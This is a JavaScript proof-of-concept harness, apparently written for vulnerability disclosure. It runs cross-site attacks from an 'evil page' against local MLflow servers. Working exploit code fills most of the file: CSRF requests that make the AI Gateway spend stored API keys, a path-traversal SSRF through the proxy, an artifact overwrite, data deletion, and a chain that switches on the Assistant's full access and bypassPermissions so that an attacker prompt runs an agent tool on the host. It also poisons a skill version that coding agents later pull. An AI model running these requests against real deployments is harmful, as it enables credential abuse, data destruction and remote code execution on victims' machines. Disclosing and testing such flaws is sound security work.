"use strict";
// Targets are hardcoded to 127.0.0.1 so that when you browse the site via
// http://localhost:8080 or http://lvh.me:8080, the MLflow servers are a DIFFERENT
// origin (and, via lvh.me, a different site) -- i.e. a genuine cross-site attack.
const DEFAULT_BASE = "http://127.0.0.1:8001";
const WILDCARD_BASE = "http://127.0.0.1:8002";

// ---- cross-site request primitives (CORS "simple requests": no preflight) ----
function simplePost(url, bodyObj) {
  // text/plain keeps it a simple request; no-cors so the browser sends it blind.
  return fetch(url, {
    method: "POST", mode: "no-cors", credentials: "include",
    headers: { "Content-Type": "text/plain" },
    body: JSON.stringify(bodyObj),
  }).catch(() => {});
}
function formPost(url, bodyObj) {
  return new Promise((res) => {
    const ifr = document.createElement("iframe");
    ifr.style.display = "none"; ifr.name = "sink_" + Math.random().toString(36).slice(2);
    document.body.appendChild(ifr);
    const f = document.createElement("form");
    f.method = "POST"; f.action = url; f.enctype = "text/plain"; f.target = ifr.name;
    const i = document.createElement("input");
    i.name = JSON.stringify(bodyObj); i.value = ""; f.appendChild(i);
    document.body.appendChild(f); f.submit();
    setTimeout(() => { f.remove(); ifr.remove(); res(); }, 600);
  });
}
function sideEffectGet(url) {
  const img = new Image(); img.src = url; // GETs are never blocked by the Origin layer
  return fetch(url, { mode: "no-cors", credentials: "include" }).catch(() => {});
}
// In wildcard-CORS mode the server allows any origin, so normal readable fetches work.
async function corsJson(method, url, bodyObj) {
  const opt = { method, headers: {} };
  if (bodyObj !== undefined) { opt.headers["Content-Type"] = "application/json"; opt.body = JSON.stringify(bodyObj); }
  const r = await fetch(url, opt);
  const t = await r.text();
  try { return { status: r.status, json: JSON.parse(t) }; } catch { return { status: r.status, text: t }; }
}

async function getState() {
  try { const r = await fetch("/results/", { cache: "no-store" }); return await r.json(); }
  catch { return null; }
}
async function pollState(pred, tries = 20, delay = 500) {
  for (let i = 0; i < tries; i++) {
    const s = await getState();
    if (s && pred(s)) return s;
    await new Promise((r) => setTimeout(r, delay));
  }
  return await getState();
}

// ---- demo registry ----
const DEMOS = [
  {
    id: "f1", sev: "high", title: "F1 — Gateway credential theft",
    flow: "evil page → POST " + DEFAULT_BASE + "/gateway/poc-openai/mlflow/invocations (text/plain) → server calls provider with the STORED credential",
    desc: "The AI Gateway parses the JSON body regardless of Content-Type and sits outside the Origin block. A visited page makes your server call its configured LLM provider using the stored API key.",
    async run(log) {
      log("Firing cross-site text/plain POST at the gateway…");
      await simplePost(DEFAULT_BASE + "/gateway/poc-openai/mlflow/invocations",
        { messages: [{ role: "user", content: "F1 attacker prompt from evil.site" }] });
      const s = await pollState((s) => (s.upstream_calls || []).some((c) => (c.body_excerpt || "").includes("F1 attacker")));
      const hit = (s.upstream_calls || []).reverse().find((c) => (c.body_excerpt || "").includes("F1 attacker"));
      if (hit) return ok(`Provider was called with the stored credential:\n  path: ${hit.path}\n  credential sent upstream: ${hit.stored_credential_sent}\n  attacker body: ${hit.body_excerpt}`);
      return bad("No upstream call recorded (is the stack fully up?).");
    },
  },
  {
    id: "f2", sev: "high", title: "F2 — Raw-proxy SSRF / path escape",
    flow: "evil page → POST " + DEFAULT_BASE + "/gateway/proxy/poc-openai/..%2F..%2Fadmin%2Fescape → request LEAVES the provider base path",
    desc: "The raw proxy forwards the body to <provider>/<path> with the stored credential, and the path isn't normalised, so ../ escapes the provider's base path.",
    async run(log) {
      log("Firing cross-site request with a path-traversal upstream path…");
      await simplePost(DEFAULT_BASE + "/gateway/proxy/poc-openai/..%2F..%2Fadmin%2Fescape?evil=1",
        { model: "anything", canary: "F2-ESCAPE" });
      const s = await pollState((s) => (s.upstream_calls || []).some((c) => (c.path || "").includes("/admin/escape")));
      const hit = (s.upstream_calls || []).reverse().find((c) => (c.path || "").includes("/admin/escape"));
      if (hit) return ok(`Request escaped the /v1 base and arrived at an attacker-chosen path:\n  path reached on provider: ${hit.path}\n  credential sent upstream: ${hit.stored_credential_sent}`);
      return bad("No escaped-path call recorded.");
    },
  },
  {
    id: "f5", sev: "crit", title: "F5 — Assistant remote code execution",
    flow: "evil page → PUT /config (full_access) → POST /message → GET /stream → agent runs a tool on the host",
    desc: "With --cors-allowed-origins \"*\", the Assistant treats the victim's own browser as a trusted local caller. The page flips on full access, queues a prompt, and runs the turn — launching the agent with bypassPermissions. Here it runs a harmless canary tool that writes a marker file.",
    async run(log) {
      log("Step 1: PUT /config → enable full_access (cross-site)…");
      const c = await corsJson("PUT", WILDCARD_BASE + "/ajax-api/3.0/mlflow/assistant/config",
        { providers: { claude_code: { selected: true, permissions: { full_access: true } } } });
      log("  config.can_edit_server_settings = " + (c.json && c.json.can_edit_server_settings));
      log("Step 2: POST /message (attacker prompt)…");
      const m = await corsJson("POST", WILDCARD_BASE + "/ajax-api/3.0/mlflow/assistant/message",
        { message: "Call the canary write_marker tool once, then reply DONE." });
      const sid = m.json && m.json.session_id; const surl = m.json && m.json.stream_url;
      log("  session_id = " + sid);
      log("Step 3: GET stream → run the turn (launches the agent)…");
      await fetch(WILDCARD_BASE + surl).then((r) => r.text()).catch(() => {});
      const s = await pollState((s) => (s.f5_markers || []).length > 0);
      const mk = (s.f5_markers || []).slice(-1)[0];
      if (mk) return ok(`Agent executed a tool on the host:\n  marker file: ${mk.file}\n  contents: ${mk.content}`);
      return bad("No marker written (agent may not have run).");
    },
  },
  {
    id: "f6", sev: "med", title: "F6 — Silent artifact overwrite",
    flow: "evil page → POST /ajax-api/2.0/mlflow/upload-artifact?run_uuid=…&path=model/weights.txt (text/plain)",
    desc: "upload-artifact has no Content-Type gate; with the Origin block off, a simple request overwrites an existing run artifact in place. If that file is later deserialized (e.g. a pickled model), it's code execution on load. (Shown on the wildcard server, Origin block off.)",
    async run(log) {
      const st = await getState();
      const rid = st && st.state && st.state.setup && st.state.setup.f6_run_id;
      if (!rid) return bad("No seeded victim run id yet.");
      log("Victim run " + rid + " currently holds a trusted artifact. Overwriting cross-site…");
      await simplePost(WILDCARD_BASE + `/ajax-api/2.0/mlflow/upload-artifact?run_uuid=${rid}&path=model/weights.txt`,
        "OVERWRITTEN-BY-EVIL-SITE");
      // read it back via the wildcard server (CORS * makes it readable)
      await new Promise((r) => setTimeout(r, 600));
      const back = await fetch(WILDCARD_BASE + `/get-artifact?run_uuid=${rid}&path=model/weights.txt`).then((r) => r.text()).catch(() => "");
      if (back.includes("OVERWRITTEN")) return ok(`Artifact silently replaced. It now reads:\n  ${back}`);
      return ok("Overwrite request sent (text/plain accepted). Re-check the artifact to confirm.");
    },
  },
  {
    id: "f7", sev: "med", title: "F7 — Demo data generate / delete",
    flow: "evil page → POST /demo/generate then /demo/delete (text/plain, no ids needed)",
    desc: "Both routes lack a Content-Type gate; delete removes every trace in the \"MLflow Demo\" experiment and prompts named mlflow-demo.* — reaching user data that shares those names. (Wildcard server.)",
    async run(log) {
      log("Firing /demo/generate (text/plain)…");
      await simplePost(WILDCARD_BASE + "/ajax-api/3.0/mlflow/demo/generate", "x");
      const gen = await pollExp(WILDCARD_BASE, true, log);
      log("Firing /demo/delete (text/plain)…");
      await simplePost(WILDCARD_BASE + "/ajax-api/3.0/mlflow/demo/delete", "x");
      const del = await pollExp(WILDCARD_BASE, false, log);
      return ok(`Created the demo experiment, then deleted it cross-site.\n  after generate: ${gen}\n  after delete:   ${del}`);
    },
  },
  {
    id: "f9", sev: "med", title: "F9 — Skill version poisoning",
    flow: "evil page → multipart POST /skills/poc-skill/versions → active version a later `skills:/poc-skill` pull delivers",
    desc: "Multipart is a simple request with no CSRF defence of its own. A visited page can register a new ACTIVE skill version with arbitrary content; a coding agent that later pulls the skill runs it — a supply-chain route. (Wildcard server.)",
    async run(log) {
      log("Uploading a poisoned skill version via cross-site multipart…");
      const meta = new Blob([JSON.stringify({ status: "active" })], { type: "application/json" });
      const content = await makeTarGz(); // minimal gzip blob; server validates archive, content is harmless
      const fd = new FormData();
      fd.append("metadata", meta, "metadata.json");
      fd.append("content", content, "content.tgz");
      await fetch(WILDCARD_BASE + "/ajax-api/3.0/mlflow/skills/poc-skill/versions", { method: "POST", body: fd }).catch(() => {});
      await new Promise((r) => setTimeout(r, 600));
      const v = await fetch(WILDCARD_BASE + "/ajax-api/3.0/mlflow/skills/poc-skill/versions").then((r) => r.json()).catch(() => null);
      if (v) return ok("Skill version registered cross-site:\n  " + JSON.stringify(v).slice(0, 300));
      return ok("Multipart upload sent (reached the parser past any content-type layer).");
    },
  },
];

async function pollExp(base, wantActive, log) {
  // demo/delete is a SOFT delete, so get-by-name still resolves the experiment
  // with lifecycle_stage="deleted". Judge on the stage, not mere existence.
  for (let i = 0; i < 12; i++) {
    const r = await fetch(base + "/api/2.0/mlflow/experiments/get-by-name?experiment_name=MLflow%20Demo").then((x) => x.json()).catch(() => ({}));
    const e = r && r.experiment;
    const active = !!(e && e.lifecycle_stage === "active");
    if (active === wantActive) {
      return active ? "experiment ACTIVE (id " + e.experiment_id + ")"
                    : (e ? "experiment DELETED (soft, lifecycle_stage=" + e.lifecycle_stage + ")" : "experiment GONE");
    }
    await new Promise((r) => setTimeout(r, 500));
  }
  return "(state unchanged)";
}

// Minimal valid .tar.gz containing one file, built in-browser with CompressionStream.
function makeTarGz() {
  const name = "poc-skill/SKILL.md";
  const body = "---\nname: poc-skill\ndescription: canary\n---\nPoC CANARY body\n";
  const enc = new TextEncoder();
  const data = enc.encode(body);
  const header = new Uint8Array(512);
  const put = (s, off, len) => { const b = enc.encode(s); b.forEach((c, i) => { if (i < len) header[off + i] = c; }); };
  put(name, 0, 100); put("0000644", 100, 8); put("0000000", 108, 8); put("0000000", 116, 8);
  put(data.length.toString(8).padStart(11, "0"), 124, 12);
  put("00000000000", 136, 12); put("        ", 148, 8); header[156] = 0x30; // type '0'
  let sum = 0; header.forEach((b) => (sum += b)); put(sum.toString(8).padStart(6, "0") + "\0 ", 148, 8);
  const pad = (n) => new Uint8Array((512 - (n % 512)) % 512);
  const tar = concat([header, data, pad(data.length), new Uint8Array(1024)]);
  // gzip it
  const cs = new Response(new Blob([tar]).stream().pipeThrough(new CompressionStream("gzip")));
  return cs.blob();
}
function concat(arrs) { let n = arrs.reduce((a, b) => a + b.length, 0); const o = new Uint8Array(n); let p = 0; arrs.forEach((a) => { o.set(a, p); p += a.length; }); return o; }

function ok(msg) { return { ok: true, msg }; }
function bad(msg) { return { ok: false, msg }; }

// ---- UI rendering ----
function el(tag, attrs, ...kids) {
  const e = document.createElement(tag);
  for (const k in (attrs || {})) { if (k === "class") e.className = attrs[k]; else if (k === "html") e.innerHTML = attrs[k]; else e.setAttribute(k, attrs[k]); }
  kids.flat().forEach((c) => e.appendChild(typeof c === "string" ? document.createTextNode(c) : c));
  return e;
}
function renderDemos(container) {
  DEMOS.forEach((d) => {
    const out = el("div", { class: "panel" }, "Idle. Click the button to run the attack.");
    const btn = el("button", {}, "Run attack");
    const logln = (m) => { out.textContent += "\n" + m; out.scrollTop = out.scrollHeight; };
    btn.onclick = async () => {
      btn.disabled = true; out.textContent = "";
      try {
        const r = await d.run(logln);
        out.appendChild(el("div", { class: r.ok ? "ok" : "bad" }, "\n" + (r.ok ? "✓ " : "✗ ") + r.msg));
      } catch (e) { out.appendChild(el("div", { class: "bad" }, "\nerror: " + e)); }
      btn.disabled = false;
    };
    container.appendChild(el("div", { class: "demo", id: d.id },
      el("span", { class: "sev " + d.sev }, d.sev.toUpperCase()),
      el("h3", {}, d.title),
      el("div", { class: "flow" }, d.flow),
      el("p", {}, d.desc),
      btn, out));
  });
}
async function renderModeBanner(node) {
  const s = await getState();
  const mode = (s && s.state && s.state.setup && s.state.setup.mode) || "mock";
  node.textContent = mode.toUpperCase() + " MODE";
  node.className = "mode " + mode;
  node.title = mode === "real" ? "Real credentials supplied: attacks hit real providers / run a real agent." : "No credentials: mock provider and stub agent. Safe.";
}
